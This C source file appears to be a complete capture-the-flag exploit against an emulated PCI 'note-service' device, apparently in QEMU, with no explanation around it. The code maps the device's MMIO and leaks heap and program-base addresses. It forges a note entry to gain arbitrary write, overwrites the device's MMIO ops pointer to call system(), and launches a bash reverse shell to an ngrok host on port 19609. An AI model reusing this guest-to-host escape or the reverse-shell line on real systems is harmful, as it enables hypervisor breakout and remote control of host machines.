#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/mount.h>
#include <sys/msg.h>
#include <sys/shm.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/xattr.h>

#include <linux/btrfs.h>
#include <linux/capability.h>
#include <linux/sysctl.h>
#include <linux/types.h>
#include <linux/userfaultfd.h>

typedef uint8_t u8;
typedef uint16_t u16;
typedef uint32_t u32;
typedef uint64_t u64;

typedef int8_t i8;
typedef int16_t i16;
typedef int32_t i32;
typedef int64_t i64;

#define DEBUG
#ifdef DEBUG

#define logOK(msg, ...) dprintf(STDERR_FILENO, "[+] " msg "\n", ##__VA_ARGS__)
#define logInfo(msg, ...) dprintf(STDERR_FILENO, "[*] " msg "\n", ##__VA_ARGS__)
#define logErr(msg, ...) dprintf(STDERR_FILENO, "[!] " msg "\n", ##__VA_ARGS__)
#else
#define errExit(...) \
    do               \
    {                \
    } while (0)

#define WAIT(...) errExit(...)
#define logOK(...) errExit(...)
#define logInfo(...) errExit(...)
#define logErr(...) errExit(...)
#endif

#define asm __asm__

#define PAGE_SIZE 0x1000
#define HW_NOTE_SERVICE_H

#define TYPE_PCI_NOTE_DEV "note-service"

#define NOTE_PCI_VENDOR_ID 0x7331
#define NOTE_PCI_DEVICE_ID 0x1337

#define REG_NOTE_COMMAND 0
#define REG_LOW_CMD_CHAIN_ADDR 1
#define REG_HIGH_CMD_CHAIN_ADDR 2


#define CMD_SUBMIT_NOTE   0x10
#define CMD_DELETE_NOTE     0x11
#define CMD_READ_NOTE     0x12
#define CMD_EDIT_NOTE     0x13
#define CMD_DUPLICATE_NOTE   0x14
#define CMD_ENCRYPT_NOTE   0x15
#define CMD_END_CHAIN     0x16
#define CMD_RESET     0x17

#define NOTE_SUCCESS    0x00
#define NOTE_RESET    0x01
#define NOTE_FAIL   0xff

typedef struct NoteEntry {
	uint64_t id;
	uint64_t size;
	uint8_t * content;
	struct NoteEntry* next;
} NoteEntry;

typedef struct NoteCmdHdr {
	uint32_t cmd_type;
	uint32_t res;
	uint32_t note_id;
	uint32_t note_size;
	uint32_t encrypt_offset;
	uint32_t new_note_id;
	uint64_t note_addr;
} NoteCmdHdr;



uint64_t gva2gpa(void *addr)
{
    uint64_t page = 0;
    int fd = open("/proc/self/pagemap", O_RDONLY);
    if (fd < 0)
    {
        logErr("error in gva2gpa");
        exit(1);
    }
    lseek(fd, ((uint64_t)addr / PAGE_SIZE) * 8, SEEK_SET);
    read(fd, &page, 8);
    close(fd);
    return ((page & 0x7fffffffffffff) * PAGE_SIZE) | ((uint64_t)addr & 0xfff);
}

void *mmio_mem;
void *dma_buf;
void *recv_buf;
u64 notes, dma_buf_gpa, mmio_gpa, recv_buf_gpa, dma_off = 0, recv_off = 0;

void mmio_write(uint32_t hwaddr, uint32_t value)
{
    *(uint32_t *)((u64)mmio_mem + hwaddr) = value;
}

u32 mmio_read(u64 hwaddr){
    return *(u32*)((u64)mmio_mem + hwaddr);
}

u64 read_reg(u64 idx){
    return mmio_read(idx * 4);
}

void write_reg(u64 idx, u64 val){
    mmio_write(idx * 4, val);
}

void add_cmd(NoteCmdHdr* hdr){
    memcpy(dma_buf + dma_off, hdr, sizeof(NoteCmdHdr));
    dma_off += sizeof(NoteCmdHdr);
}

void add_note(u64 id, u64 size, unsigned char*data){
    NoteCmdHdr hdr;
    hdr.cmd_type = CMD_SUBMIT_NOTE;
    hdr.note_id = id;
    hdr.note_size = size;
    hdr.note_addr = recv_buf_gpa + recv_off;

    add_cmd(&hdr);
    memcpy(recv_buf + recv_off, data, size);
    recv_off += size;
}

void read_note(u64 id, u64 size){
    NoteCmdHdr hdr;
    hdr.cmd_type = CMD_READ_NOTE;
    hdr.note_id = id;
    hdr.note_size = size;
    hdr.note_addr = recv_buf_gpa + recv_off;
    add_cmd(&hdr);
}

void edit_note(u64 id, u64 size, unsigned char* data){
    NoteCmdHdr hdr;
    hdr.cmd_type = CMD_EDIT_NOTE;
    hdr.note_id = id;
    hdr.note_size = size;
    hdr.note_addr = recv_buf_gpa + recv_off;
    add_cmd(&hdr);
    
    memcpy(recv_buf + recv_off, data, size);
    recv_off += size;
}

void end_chain(){
    NoteCmdHdr hdr;
    hdr.cmd_type = CMD_END_CHAIN;
    add_cmd(&hdr);
}

void craft_fake_note(u64 off, u64 id, u64 size, u64 target){
    mmio_write(off, id);
    mmio_write(off + 8, size);
    mmio_write(off + 0x10, target & 0xffffffff);
    mmio_write(off + 0x14, target >> 32);

    mmio_write(0x80, (notes + off) & 0xffffffff);
    mmio_write(0x84, (notes + off) >> 32);
}



int main(){
    int fd = open("/sys/devices/pci0000:00/0000:00:04.0/resource0", O_RDWR | O_SYNC);
    if (fd < 0){
        logErr("Failed to open");
        exit(-1);
    }
    mmio_mem = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (mmio_mem == MAP_FAILED){
        logErr("Failed to mmap device");
    }
    dma_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (dma_buf == MAP_FAILED){
        logErr("Failed to dma mmap");
    }
    recv_buf = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
    if (recv_buf == MAP_FAILED){
        logErr("Failed to mmap recv buffer");
    }
    
    mlock(dma_buf, 0x1000);
    mlock(recv_buf, 0x1000);

    dma_buf_gpa = gva2gpa(dma_buf);
    recv_buf_gpa = gva2gpa(recv_buf);
    printf("MMIO mem: 0x%llx\n", mmio_mem);
    printf("DMA buf: 0x%llx\n", dma_buf);
    printf("DMA buf gpa: 0x%llx\n", dma_buf_gpa);

    notes = read_reg(35) << 32 | read_reg(34) - 0x80;
    logOK("Notes: 0x%llx\n", notes);

    u64 pie = read_reg(47) << 32 | read_reg(46) - 0x92125d;
    logOK("PIE: 0x%llx\n", pie);

    u64 system = pie + 0x32e020;
    u64 setuid_got = pie + 0x1186df0;
    // Arbitrary write
    
    unsigned char* str = "kumahuy";
    u64 fake_mmio = notes + 0x30;
    u64 cmd_addr = notes + 0x40;
    u64 opaque = notes - 0xb40;
    unsigned char* cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/0.tcp.ap.ngrok.io/19609 0>&1'";
    
    craft_fake_note(0x10, 0x888, 0xd00, opaque);

    mmio_write(0x30, system & 0xffffffff);
    mmio_write(0x34, system >> 32);
    mmio_write(0x38, system & 0xffffffff);
    mmio_write(0x3c, system >> 32);
    read_note(0x888, 0xd00);
    end_chain();
    
    mmio_write(4, dma_buf_gpa);
    mmio_write(0, 0);
    dma_off = 0; recv_off = 0;

    u64 ops[2];
    ops[0] = fake_mmio;
    memcpy(recv_buf, cmd, strlen(cmd) + 1); // overwrite opaque to arbitrary command
    memcpy((char*)recv_buf + 0xa80, ops, 8); // overwrite mmio.ops to fake mmio, containing system

    char buf[0x1000];
    memcpy(buf, recv_buf, 0xd00);

    edit_note(0x888, 0xd00, buf); 
    end_chain();
    mmio_write(4, dma_buf_gpa);
    mmio_write(0, 0); // arbitrary write

    mmio_write(0, 0); // trigger system("reverse shell command")
}  